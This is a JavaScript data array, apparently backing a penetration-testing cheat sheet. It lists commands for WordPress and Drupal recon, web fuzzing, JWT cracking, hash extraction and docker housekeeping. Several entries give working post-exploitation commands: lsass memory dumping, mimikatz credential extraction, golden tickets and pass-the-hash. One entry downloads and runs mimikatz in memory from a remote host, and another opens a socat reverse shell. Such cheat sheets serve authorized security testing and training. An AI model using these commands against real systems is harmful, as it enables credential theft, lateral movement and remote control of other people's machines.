var data = [
    {
        "id": 1,
        "tool": "WPSCAN",
        "category": "RECON",
        "information": "Scan wordpress web site with wpscan",
        "command": "wpscan --proxy http://127.0.0.1:8080 --url [url] --disable-tls-checks -e ap,tt,cb,dbe,u1-20,m --api-token [wpscan_apitoken]",
        "link": "https://github.com/wpscanteam/wpscan"
    },
    {
        "id": 2,
        "tool": "drupwn",
        "category": "RECON",
        "information": "Scan drupal web site with drupwn",
        "command": "drupwn --users --nodes --modules --dfiles --themes enum [url]",
        "link": "https://github.com/immunIT/drupwn"
    },
    {
        "id": 3,
        "tool": "WEB",
        "category": "RECON",
        "information": "Extract all links from a web page",
        "command": "curl -k -s [url] | grep -o 'http://[^\"]*' | cut -d \"/\" -f 3 | sort -u"
    },
    {
        "id": 4,
        "tool": "gobuster",
        "category": "ATTACK/FUZZ",
        "information": "Fuzz a web site with gobuster with classic extensions",
        "command": "gobuster dir -u [url] -w [wordlist] -x php,html,txt,xml,md [add other] -o [outputfile]",
        "link": "https://github.com/OJ/gobuster"
    },
    {
        "id": 5,
        "tool": "ffuf",
        "category": "ATTACK/FUZZ",
        "information": "Fuzz a web site with ffuf with classic extensions",
        "command": "ffuf -u [url]/FUZZ -w [wordlist]",
        "link": "https://github.com/ffuf/ffuf"
    },
    {
        "id": 6,
        "tool": "ffuf",
        "category": "ATTACK/FUZZ",
        "information": "Fuzz a web site with ffuf with a custom header and response size and code filter",
        "command": "ffuf -u [url]/FUZZ -w [wordlist] -H 'Cookie: [cookie]' -fs [size] -fc [code]",
        "link": "https://github.com/ffuf/ffuf"
    },
    {
        "id": 7,
        "tool": "ffuf",
        "category": "ATTACK/FUZZ",
        "information": "Fuzz a web site with ffuf with a post data",
        "command": "ffuf -u [url] -w [wordlist] -X POST -d '[data]'",
        "link": "https://github.com/ffuf/ffuf"
    },
    {
        "id": 8,
        "tool": "JwtTool",
        "category": "RECON",
        "information": "Bruteforce a JWT token key",
        "command": "python3 jwt_tool.py -d [wordlist] [token]",
        "link": "https://github.com/ticarpi/jwt_tool"
    },
    {
        "id": 9,
        "tool": "JwtTool",
        "category": "RECON",
        "information": "JWT tool perform all test on a token",
        "command": "python3 jwt_tool.py -M at -t \"[url]\" -rh \"Authorization: Bearer [JWT_Token]\" -rh \"[other_header]\" -rc \"[cookies]\"",
        "link": "https://github.com/ticarpi/jwt_tool"
    },
    {
        "id": 10,
        "tool": "sed",
        "category": "UTILS",
        "information": "Replace multiple space to one",
        "command": "sed -e 's/  */ /g'"
    },
    {
        "id": 11,
        "tool": "sed",
        "category": "UTILS",
        "information": "Remove the last char",
        "command": "sed 's/.$//'"
    },
    {
        "id": 12,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract md5 hash ({32})",
        "command": "egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' [file] | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt"
    },
    {
        "id": 13,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract sha1 hash ({40})",
        "command": "egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{40}([^a-fA-F0-9]|$)' [file] | egrep -o '[a-fA-F0-9]{40}' > sha1-hashes.txt"
    },
    {
        "id": 14,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract sha256 hash ({64})",
        "command": "egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{64}([^a-fA-F0-9]|$)' [file] | egrep -o '[a-fA-F0-9]{64}' > sha256-hashes.txt"
    },
    {
        "id": 15,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract sha512 hash ({128})",
        "command": "egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{128}([^a-fA-F0-9]|$)' [file] | egrep -o '[a-fA-F0-9]{128}' > sha512-hashes.txt"
    },
    {
        "id": 16,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract valid MySQL-old hash",
        "command": "grep -e \"[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}\" [file] > mysql-old-hashes.txt"
    },
    {
        "id": 17,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract valid blowfish hash",
        "command": "grep -e \"$2a\\$\\08\\$(.){75}\" [file] > blowfish-hashes.txt"
    },
    {
        "id": 18,
        "tool": "Others grep",
        "category": "UTILS",
        "information": "Extract emails from file",
        "command": "grep -E -o \"\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\\b\" [file]"
    },
    {
        "id": 19,
        "tool": "Others grep",
        "category": "UTILS",
        "information": "Extract IP from file",
        "command": "grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" file.txt"
    },
    {
        "id": 20,
        "tool": "Compile",
        "category": "CODE/COMPILE",
        "information": "Compile windows PE executable on linux",
        "command": "i686-w64-mingw32-gcc -o [output.exe] [source.c] -lws2_32"
    },
    {
        "id": 22,
        "tool": "QR code",
        "category": "UTILS",
        "information": "Create a QR code",
        "command": "echo [content] | curl -F-=\<- qrenco.de"
    },
    {
        "id": 23,
        "tool": "linux bash",
        "category": "UTILS",
        "information": "Search and replace within a file",
        "command": "sed -i 's/[search]/[replace]/g' [file]"
    },
    {
        "id": 24,
        "tool": "linux bash",
        "category": "UTILS",
        "information": "Copy file frome remote server to local",
        "command": "scp [user]@[remote]:[file] [local]"
    },
    {
        "id": 25,
        "tool": "linux bash",
        "category": "UTILS",
        "information": "Copy file from local to remote server",
        "command": "scp [file] [user]@[remote]:[path]"
    },
    {
        "id": 26,
        "tool": "procdump",
        "category": "POST-EXPLOITATION",
        "information": "Dump a process memory - local",
        "command": "procdump.exe -accepteula -ma [pid or name] [output.dmp]"
    },
    {
        "id": 27,
        "tool": "procdump",
        "category": "POST-EXPLOITATION",
        "information": "Dump a process memory - remote",
        "command": "net use Z: https://live.sysinternals.com; Z:\\procdump.exe -accepteula -ma [lsass.exe] [lsass.dmp]"
    },
    {
        "id": 28,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz one liner",
        "command": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 29,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "load mimikatz in memory",
        "command": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://[ip]/mimikatz.ps1')\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 30,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz disable ppl and dump password",
        "command": "mimikatz.exe \"privilege::debug\" \"!+\" \"!processprotect /process:lsass.exe /remove\" \"sekurlsa::logonpasswords\" \"exit\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },

    {
        "id": 31,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz extract credentials from dump",
        "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords\" \"exit\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 32,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz extract credentials from shadow copy (1)",
        "command": "mimikatz.exe \"lsadump::sam /system:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY /sam:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 33,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz extract credentials from shadow copy (2)",
        "command": "mimikatz.exe \"lsadump::secrets /system:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 34,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz extract tickets",
        "command": "mimikatz.exe \"sekurlsa::tickets /export\" \"exit\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 35,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION/CREDS_RECOVER",
        "information": "mimikatz - forest extra SID",
        "command": "kerberos::golden /user:[user] /domain:[domain] /sid:[child_sid] /krbtgt:[krbtgt_ntlm] /sids:[parent_sid]-519 /ptt",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 36,
        "tool": "mimikatz",
        "category": "PIVOTING",
        "information": "mimikatz pth to RDP mstsc.exe",
        "command": "sekurlsa::pth /user:[user] /domain:<domain> /ntlm:<ntlm_hash> /run:\"mstsc.exe /restrictedadmin\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 37,
        "tool": "mimikatz",
        "category": "PIVOTING",
        "information": "mimikatz pth run powershell remotelly",
        "command": "sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[ntlm_hash] /run:\"powershell.exe -exec bypass\"",
        "link": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "id": 38,
        "tool": "socat",
        "category": "PIVOTING",
        "information": "socat port forwarding listener (on local machine)",
        "command": "./socat TCP-LISTEN:[port_listener],fork,reuseaddr TCP-LISTEN:[port_to_forward]",
        "link": "http://www.dest-unreach.org/socat/"
    },
    {
        "id": 39,
        "tool": "socat",
        "category": "PIVOTING",
        "information": "socat port forwarding connect (on remote machine)",
        "command": "socat TCP:[connect_ip]:[connect_port] TCP:127.0.0.1:[port_to_forward]",
        "link": "http://www.dest-unreach.org/socat/"
    },
    {
        "id": 40,
        "tool": "socat",
        "category": "PIVOTING",
        "information": "socat reverse shell (remote victime)",
        "command": "./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[listner_ip]:[listner_port]",
        "link": "http://www.dest-unreach.org/socat/"
    },
    {
        "id": 41,
        "tool": "socat",
        "category": "PIVOTING",
        "information": "socat reverse shell (local listener)",
        "command": "socat file:`tty`,raw,echo=0 tcp-listen:[port|4444]",
        "link": "http://www.dest-unreach.org/socat/"
    },
    {
        "id": 42,
        "tool": "chisel",
        "category": "PIVOTING",
        "information": "chisel server (server on local machine)",
        "command": "chisel server -p [port] --reverse",
        "link": "https://github.com/jpillora/chisel"
    },
    {
        "id": 43,
        "tool": "chisel",
        "category": "PIVOTING",
        "information": "chisel reverse port forwarding (client on remote machine) - forward client port on server",
        "command": "chisel client -v [server_ip]:[server_port] R:[serverside-port]:[clientside-host|localhost]:[clientside-port]",
        "link": "https://github.com/jpillora/chisel"
    },
    {
        "id": 44,
        "tool": "chisel",
        "category": "PIVOTING",
        "information": "chisel remote port forwarding (client on remote machine) - forward server port on client",
        "command": "chisel client -v [server_ip]:[server_port|8000] [clientside-host|0.0.0.0]:[clientside-port]:[serverside-host|127.0.0.1]:[serverside-port]",
        "link": "https://github.com/jpillora/chisel"
    },
    {
        "id": 45,
        "tool": "chisel",
        "category": "PIVOTING",
        "information": "chisel socks proxy (client on remote machine)",
        "command": "chisel client [server_ip]:[server_port] R:socks",
        "link": "https://github.com/jpillora/chisel"
    },
    {
        "id": 46,
        "tool": "docker",
        "category": "UTILS",
        "information": "Remove docker image",
        "command": "docker image rm [image_id]",
    },
    {
        "id": 47,
        "tool": "docker",
        "category": "UTILS",
        "information": "Delete an image from the local image store",
        "command": "docker rmi [image_id]",
    },
    {
        "id": 48,
        "tool": "docker",
        "category": "UTILS",
        "information": "List all images that are locally stored with the Docker Engine",
        "command": "docker images",
    },
    {
        "id": 49,
        "tool": "docker",
        "category": "UTILS",
        "information": "List all containers that are locally stored with the Docker Engine",
        "command": "docker ps -a",
    },
    {
        "id": 51,
        "tool": "docker",
        "category": "UTILS",
        "information": "List all containers that are currently running",
        "command": "docker ps -q",
    },
    {
        "id": 53,
        "tool": "docker",
        "category": "UTILS",
        "information": "Stop a running container",
        "command": "docker stop [container_id]",
    },
    {
        "id": 54,
        "tool": "docker",
        "category": "UTILS",
        "information": "Stop all running containers",
        "command": "docker stop $(docker ps -a -q)",
    },
    {
        "id": 55,
        "tool": "docker",
        "category": "UTILS",
        "information": "Build an image from the Dockerfile in the current directory and tag the image",
        "command": "docker build -t [image_name] .",
    },
    {
        "id": 56,
        "tool": "docker",
        "category": "UTILS",
        "information": "Pull an image from a registry",
        "command": "docker pull [image_name]:[tag]",
    },
    {
        "id": 57,
        "tool": "docker",
        "category": "UTILS",
        "information": "Create a new bash process inside the container and connect it to the terminal",
        "command": "docker exec -it [container_id] bash",
    },
    {
        "id": 58,
        "tool": "docker",
        "category": "UTILS",
        "information": "Print the last lines of a container’s logs",
        "command": "docker logs --tail 100 [container_id] | less",
    },
    {
        "id": 59,
        "tool": "docker",
        "category": "UTILS",
        "information": "Print the last lines of a container’s logs and follow",
        "command": "docker logs -f --tail 100 [container_id]",
    },
    {
        "id": 60,
        "tool": "docker",
        "category": "UTILS",
        "information": "Create new network",
        "command": "docker network create [network_name]",
    },
    {
        "id": 61,
        "tool": "docker",
        "category": "UTILS",
        "information": "List all networks",
        "command": "docker network ls",
    },
    {
        "id": 62,
        "tool": "docker",
        "category": "UTILS",
        "information": "Builds, (re)creates, starts, and attaches to containers for all services",
        "command": "docker-compose up",
    },
    {
        "id": 63,
        "tool": "docker",
        "category": "UTILS",
        "information": "Builds, (re)creates, starts, and dettaches to containers for all services",
        "command": "docker-compose up -d",
    },
    {
        "id": 64,
        "tool": "docker",
        "category": "UTILS",
        "information": "Stops containers and removes containers, networks, volumes, and images created by up",
        "command": "docker-compose down",
    },
    
]